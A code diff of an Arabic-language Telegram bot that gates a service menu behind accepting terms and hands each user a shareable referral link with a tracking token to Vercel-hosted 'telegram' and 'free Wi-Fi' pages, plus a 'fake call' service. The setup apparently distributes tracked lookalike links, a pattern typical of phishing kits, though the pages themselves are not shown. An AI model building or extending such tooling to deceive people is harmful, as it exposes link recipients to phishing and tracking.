@@ -41,12 +41,17 @@ function sendMainMenu(chatId) {
                         },
 
                         {
-                            text: "📞 اتصال",
-                            callback_data: "call"
+                            text: "📞 اتصال وهمي",
+                            callback_data: "twitter"
                         }
                     ],
 
                     [
+                        {
+                            text: "💬 خدمة أخرى",
+                            callback_data: "service"
+                        },
+
                         {
                             text: "📶 Wi-Fi",
                             callback_data: "wifi"
@@ -92,19 +97,20 @@ bot.onText(/^\/start$/, async (msg) => {
             `${firstName} ${lastName}`.trim();
 
 
-        // إذا وافق سابقًا → القائمة
-        if (
-            acceptedUsers.has(chatId)
-        ) {
+        // ----------------------------------------------------
+        // إذا كان وافق مسبقًا → القائمة
+        // ----------------------------------------------------
 
-            return sendMainMenu(
-                chatId
-            );
+        if (acceptedUsers.has(chatId)) {
+
+            return sendMainMenu(chatId);
 
         }
 
 
-        // أول مرة → الشروط
+        // ----------------------------------------------------
+        // أول دخول → رسالة الشروط
+        // ----------------------------------------------------
 
         await bot.sendMessage(
 
@@ -125,13 +131,11 @@ ${username}
 باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,
 
             {
-
                 reply_markup: {
 
                     inline_keyboard: [
 
                         [
-
                             {
                                 text:
                                     "✅ أوافق على الشروط",
@@ -139,7 +143,6 @@ ${username}
                                 callback_data:
                                     "accept_terms"
                             }
-
                         ]
 
                     ]
@@ -183,13 +186,9 @@ bot.on(
             // قبول الشروط
             // =================================================
 
-            if (
-                data === "accept_terms"
-            ) {
+            if (data === "accept_terms") {
 
-                acceptedUsers.add(
-                    chatId
-                );
+                acceptedUsers.add(chatId);
 
 
                 await bot.answerCallbackQuery(
@@ -228,12 +227,10 @@ ${chatId}
 
 
             // =================================================
-            // منع استخدام القائمة قبل الموافقة
+            // التأكد من الموافقة
             // =================================================
 
-            if (
-                !acceptedUsers.has(chatId)
-            ) {
+            if (!acceptedUsers.has(chatId)) {
 
                 await bot.answerCallbackQuery(
 
@@ -252,7 +249,7 @@ ${chatId}
 
 
             // =================================================
-            // الخدمات
+            // روابط الخدمات
             // =================================================
 
             const websites = {
@@ -266,8 +263,11 @@ ${chatId}
                 telegram:
                     "https://telegram-one-rho.vercel.app/",
 
-                call:
+                twitter:
                     "https://callmyphone.org/",
+
+                service:
+                    "https://example.com/",
 
                 wifi:
                     "https://wifi-free-gamma.vercel.app/"
@@ -279,7 +279,6 @@ ${chatId}
                 websites[data];
 
 
-            // زر غير معروف
             if (!website) {
 
                 await bot.answerCallbackQuery(
@@ -292,17 +291,15 @@ ${chatId}
 
 
             // =================================================
-            // إنشاء Referral خاص بالمستخدم
+            // إنشاء Referral Token
             // =================================================
 
             const token =
-                await createReferral(
-                    chatId
-                );
+                await createReferral(chatId);
 
 
             // =================================================
-            // إنشاء الرابط
+            // إنشاء الرابط الجديد
             // =================================================
 
             const separator =
@@ -338,6 +335,9 @@ ${chatId}
 `🔗 هذا رابطك الخاص:
 
 ${referralUrl}
+
+🆔 Chat ID الخاص بك:
+${chatId}
 
 يمكنك مشاركة الرابط.`
 
